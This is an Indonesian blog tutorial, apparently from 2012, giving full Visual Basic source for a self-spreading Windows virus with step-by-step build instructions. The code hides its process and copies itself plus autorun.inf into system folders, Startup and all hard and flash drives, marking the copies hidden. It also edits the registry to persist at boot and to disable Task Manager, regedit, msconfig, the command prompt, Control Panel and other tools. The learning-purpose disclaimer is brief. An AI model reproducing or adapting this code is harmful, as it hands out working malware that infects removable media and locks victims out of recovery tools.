---
title: 'Cara Membuat Virus (Source Code Virus)'
date: 2012-03-15T13:59:00.000+07:00
draft: false
aliases: [ "/2012/03/kali-ini-saya-akan-berbagi-source-code.html" ]
tags : [Bahasa Pemrograman, Tips dan Trick]
---

[![](http://2.bp.blogspot.com/-KrholgsgGh8/T2GWPaKBZWI/AAAAAAAAAQA/Ct9WNZ88auI/s320/Untitled.jpg)](http://2.bp.blogspot.com/-KrholgsgGh8/T2GWPaKBZWI/AAAAAAAAAQA/Ct9WNZ88auI/s1600/Untitled.jpg)

  

Kali ini saya akan berbagi Source Code Virus buatan saya yang ditulis dengan Bahasa Visual Basic, saya sudah mencobanya dulu waktu masih awal-awal belajar Visual Basic. Dan saya juga minta maaf kepada teman-teman saya dan semua orang yang pernah menjadi korban kejahilan saya dulu waktu masih coba-coba dengan Source Code ini.  
Saya waktu itu masih khilaf...  
hehehehe... maafin saya ya...???

  

Source Code ini saya tulis di blog saya bukan berarti mengajari orang yang membaca untuk membuat virus dan menjahili orang lain, tapi untuk tujuan agar bisa belajar tentang Bahasa Visual Basic dan Struktur Virus itu di buat. Ini saya juga menggunakan bantuan spoiler agar lebih mudah dalam membacanya.

  
Oke. Sekarang kita mulai belajarnya....!!!  
Kita mulai dengan membuka Program Visual Basic nya, buat **New Project - Standart EXE**  
Kemudian buatlah rancangan Form nya seperti gambar dibawah :  

**Rancangan Form**: 

[![](http://3.bp.blogspot.com/-mxxWzAX3rxs/T2GLTpL5e5I/AAAAAAAAAPg/fqasEUcdqnY/s320/label1.jpg)](http://3.bp.blogspot.com/-mxxWzAX3rxs/T2GLTpL5e5I/AAAAAAAAAPg/fqasEUcdqnY/s1600/label1.jpg)

  
  
  

Tampilan form dengan penggunaan satu label.

Pengaturan pada Project explorer dan Project Properties seperti gambar di bawah :  

**Pengaturan Project**: 

[![](http://1.bp.blogspot.com/-v84SypWI_xY/T2GMaktjuRI/AAAAAAAAAPs/nrwVhjFeWJ4/s320/pro.jpg)](http://1.bp.blogspot.com/-v84SypWI_xY/T2GMaktjuRI/AAAAAAAAAPs/nrwVhjFeWJ4/s1600/pro.jpg)

  
  
  

Penamaan project, file, form, module pada Project Explorer dan caption pada Properties

Gunakan Control Timer untuk mendukung proses penyebaran seperti gambar di bawah :  

**Penggunaan Control Timer**: 

[![](http://1.bp.blogspot.com/-dyBL1Mavlks/T2GNrKfdIpI/AAAAAAAAAP4/ZnVXYT99osU/s320/timer.jpg)](http://1.bp.blogspot.com/-dyBL1Mavlks/T2GNrKfdIpI/AAAAAAAAAP4/ZnVXYT99osU/s1600/timer.jpg)

  
  
  

Penggunaan Timer Untuk Mendukung Proses Penggandaan File dan Penyebaran Melalui Flash Disk

  
Kemudian masukkan Source Code dibawah ini pada **Form dan Control Timer**:  

**Code pada Form**: 

Private Sub Form\_Load()  
App.TaskVisible = False  
Main  
End Sub

**Code pada Control Timer**: 

Private Sub Timer1\_Timer()  
Label1.Caption = Time()  
InfeksiDriveRemovable  
End Sub

  
Kemudian Buatlah Modul, **Project - Add Module**  

**Modul 1**: 

Public Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" \_  
(ByVal lpExistingFileName As String, ByVal lpNewFileName As String, \_  
ByVal bFailIfExists As Long) As Long

**Modul 2**: 

Public Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" \_  
ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) \_  
As Long

**Modul 3**: 

Public Declare Function SHGetPathFromIDList Lib "shell32.dll" \_  
Alias "SHGetPathFromIDListA" \_  
(ByVal pidl As Long, ByVal pszPath As String) \_  
As Long

**Modul 4**: 

Public Declare Function GetSystemDirectory Lib "kernel32.dll" \_  
Alias "GetSystemDirectoryA" \_  
(ByVal lpBuffer As String, ByVal nSize As Long) \_  
As Long

**Modul 5**: 

Public Declare Function GetWindowsDirectory Lib "kernel32.dll" \_  
Alias "GetWindowsDirectoryA" \_  
(ByVal lpBuffer As String, ByVal nSize As Long) \_  
As Long

**Modul 6**: 

Public Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" \_  
(ByVal nDrive As String) \_  
As Long

**Modul 7**: 

Public Declare Function SetFileAttributes Lib "kernel32" Alias "SetFileAttributesA" \_  
(ByVal lpFileName As String, ByVal dwFileAttributes As Long) \_  
As Long

**Modul 8**: 

Public Declare Function GetFileAttributes Lib "kernel32" \_  
Alias "GetFileAttributesA" \_  
(ByVal lpFileName As String) As Long  
Public Type SHITEMID  
Ned As Long  
Jun As Byte  
End Type  
Public Type ITEMIDLIST  
Uned As SHITEMID  
End Type  
Enum SFolder  
CSIDL\_STARTUP = &H7  
End Enum  
Public Const FILE\_ATTRIBUTE\_READONLY = &H1  
Public Const FILE\_ATTRIBUTE\_HIDDEN = &H2

**Modul 9**: 

Public Sub Main()  
On Error Resume Next  
InfeksiFolderSistem  
InfeksiDriveRemovable  
AturAtributFile  
InfeksiRegistry  
End Sub

**Modul 10**: 

Public Function GetFileSumber() As String  
On Error Resume Next  
GetFileSumber = App.Path & "\\" & App.EXEName & ".exe"  
End Function

**Modul 11**: 

Public Function GetSpecialfolder(JenisFolder As SFolder) As String  
Dim Jun1 As Long, IDL As ITEMIDLIST  
Jun1 = SHGetSpecialFolderLocation(100, JenisFolder, IDL)  
If Jun1 = NOERROR Then  
Path$ = Space$(512)  
Jun1 = SHGetPathFromIDList(ByVal IDL.Uned.Ned, ByVal Path$)  
GetSpecialfolder = Left$(Path, InStr(Path, Chr$(0)) - 1) & "\\"  
Exit Function  
End If  
GetSpecialfolder = ""  
End Function

**Modul 12**: 

Public Function GetSystemPath() As String  
On Error Resume Next  
Dim Buffer As String \* 255, Ned1 As Long  
Ned1 = GetSystemDirectory(Buffer, 255)  
GetSystemPath = Left(Buffer, Ned1) & "\\"  
End Function

**Modul 13**: 

Public Function GetWindowsPath() As String  
On Error Resume Next  
Dim Buffer As String \* 255, Ned1 As Long  
Ned1 = GetWindowsDirectory(Buffer, 255)  
GetWindowsPath = Left(Buffer, Ned1) & "\\"  
End Function

**Modul 14**: 

Public Function InfeksiFolderSistem() As String  
On Error Resume Next  
'-- menggandakan file virus  
CopyFile GetFileSumber, GetWindowsPath & "VirusFuady.exe", 0  
CopyFile GetFileSumber, GetSystemPath & "VirusFuady.exe", 0  
CopyFile GetFileSumber, GetSpecialfolder(CSIDL\_STARTUP) & \_  
"VirusFuady.exe", 0  
'-- menggandakan file autorun  
CopyFile App.Path & "\\" & "autorun.inf", GetWindowsPath & "autorun.inf", 0  
CopyFile App.Path & "\\" & "autorun.inf", GetSystemPath & "autorun.inf", 0  
CopyFile App.Path & "\\" & "autorun.inf", GetSpecialfolder(CSIDL\_STARTUP) & \_  
"autorun.inf", 0  
End Function

**Modul 15**: 

Public Function InfeksiDriveRemovable() As String  
Dim DriveAscii As Integer, DriveHuruf As String  
DriveHuruf = ""  
For DriveAscii = 66 To 90  
DriveHuruf = Chr(DriveAscii) & ":\\"  
If GetDriveType(DriveHuruf) = 3 Or GetDriveType(DriveHuruf) = 2 Then  
'-- Type drive 3 = Hardisk, 2 = Flash Disk  
'-- menggandakan file virus  
CopyFile GetFileSumber, DriveHuruf & "VirusFuady.exe", 0  
'-- menggandakan file autorun  
CopyFile App.Path & "\\" & "autorun.inf", DriveHuruf & "autorun.inf", 0  
End If  
Next  
End Function

**Modul 16**: 

Public Function AturAtributFile() As String  
Dim DriveAscii As Integer, DriveHuruf As String  
DriveHuruf = ""  
For DriveAscii = 66 To 90  
DriveHuruf = Chr(DriveAscii) & ":\\"  
If GetDriveType(DriveHuruf) = 3 Or GetDriveType(DriveHuruf) = 2 Then  
'Type drive 3 = Hardisk, 2 = Flash Disk  
SetFileAttributes DriveHuruf & "VirusFuady.exe", \_  
FILE\_ATTRIBUTE\_HIDDEN Or FILE\_ATTRIBUTE\_READONLY  
End If  
Next  
SetFileAttributes GetWindowsPath & "VirusFuady.exe", \_  
FILE\_ATTRIBUTE\_HIDDEN Or FILE\_ATTRIBUTE\_READONLY  
SetFileAttributes GetSystemPath & "VirusFuady.exe", \_  
FILE\_ATTRIBUTE\_HIDDEN Or FILE\_ATTRIBUTE\_READONLY  
SetFileAttributes GetSpecialfolder(CSIDL\_STARTUP) & \_  
"VirusFuady.exe", FILE\_ATTRIBUTE\_HIDDEN Or \_  
FILE\_ATTRIBUTE\_READONLY  
End Function

**Modul 17**: 

Public Function InfeksiRegistry()  
Dim WShell As Object, RG1 As String, RG2 As String  
Dim RG3 As String, RG4 As String  
RG1 = "Software\\Microsoft\\Windows\\CurrentVersion\\"  
RG2 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"  
RG3 = "Software\\Microsoft\\Internet Explorer\\Main\\"  
RG4 = "Software\\Policies\\Microsoft\\Windows\\system\\"  
Set WShell = CreateObject("WScript.Shell")  
'-- merubah registered owner windows  
WShell.Regwrite "HKLM\\" & RG2 & "\\RegisteredOwner", "Virus"  
'-- merubah registered organization windows  
WShell.Regwrite "HKLM\\" & RG2 & "\\RegisteredOrganization", "Rekayasa"  
'-- merubah Title Internet Explorer  
WShell.Regwrite "HKCU\\" & RG3 & "\\Window Title", "::Rakayasa::Virus::"  
'-- mengaktifkan virus pada saat setiap starup sistem  
WShell.Regwrite "HKLM\\" & RG1 & "\\Run\\RekayasaVirus", \_  
GetWindowsPath & "RekayasaVirus.exe"  
'-- blokir command prompt  
WShell.Regwrite "HKCU\\" & RG4 & "DisableCMD", \_  
"1", "REG\_DWORD"  
'-- blokir task manager  
WShell.Regwrite "HKCU\\" & RG1 & "Policies\\System\\DisableTaskMgr", \_  
"1", "REG\_DWORD"  
'-- blokir regedit  
WShell.Regwrite "HKCU\\" & RG1 & "Policies\\System\\DisableRegistryTools", \_  
"1", "REG\_DWORD"  
'-- blokir msconfig  
WShell.Regwrite "HKCU\\" & RG1 & "Policies\\System\\DisableMsConfig", \_  
"1", "REG\_DWORD"  
'-- advanced hidden  
WShell.Regwrite "HKCU\\" & RG1 & "Advanced\\Hidden", "0", "REG\_DWORD"  
'-- blokir fasilitas run  
WShell.Regwrite "HKCU\\" & RG1 & "Policies\\Explorer\\NoRun", \_  
"1", "REG\_DWORD"  
'-- blokir fasilitas pencarian  
WShell.Regwrite "HKCU\\" & RG1 & "Policies\\Explorer\\NoFind", \_  
"1", "REG\_DWORD"  
'-- blokir fasilitas pengaturan folder  
WShell.Regwrite "HKCU\\" & RG1 & "Policies\\Explorer\\NoFolderOptions", \_  
"1", "REG\_DWORD"  
'-- blokir fasilitas-fasilitas lainnya  
WShell.Regwrite "HKCU\\" & RG1 & "Policies\\Explorer\\NoClose", \_  
"1", "REG\_DWORD"  
WShell.Regwrite "HKCU\\" & RG1 & "Policies\\Explorer\\NoControlPanel", \_  
"1", "REG\_DWORD"  
WShell.Regwrite "HKCU\\" & RG1 & "Policies\\Explorer\\NoViewContextMenu", \_  
"1", "REG\_DWORD"  
WShell.Regwrite "HKCU\\" & RG1 & "Policies\\Explorer\\NoStartMenuMorePrograms", \_  
"1", "REG\_DWORD"  
WShell.Regwrite "HKCU\\" & RG1 & "Policies\\Explorer\\NoViewOnDrive", \_  
"1", "REG\_DWORD"  
Set WShell = Nothing  
End Function

Didalam setiap form dan modul ini terdapat perintah-perintah dan fungsi-fungsi yang saling terkait dan menunjang. Setelah semuanya dibuat, Program ini akan dapat berjalan setelah dilakukan kompilasi menjadi file executable dengan perintah menu compilasi pada Visual basic,  
  
  
  

**File - make Virus Fuady.exe**

  
Kemudian anda bisa melihat sendiri hasilnya. Jangan dipakai buat menjahili orang lain yah???  
  
Sekian dulu tutorial dari saya. **Semoga bermanfaat...**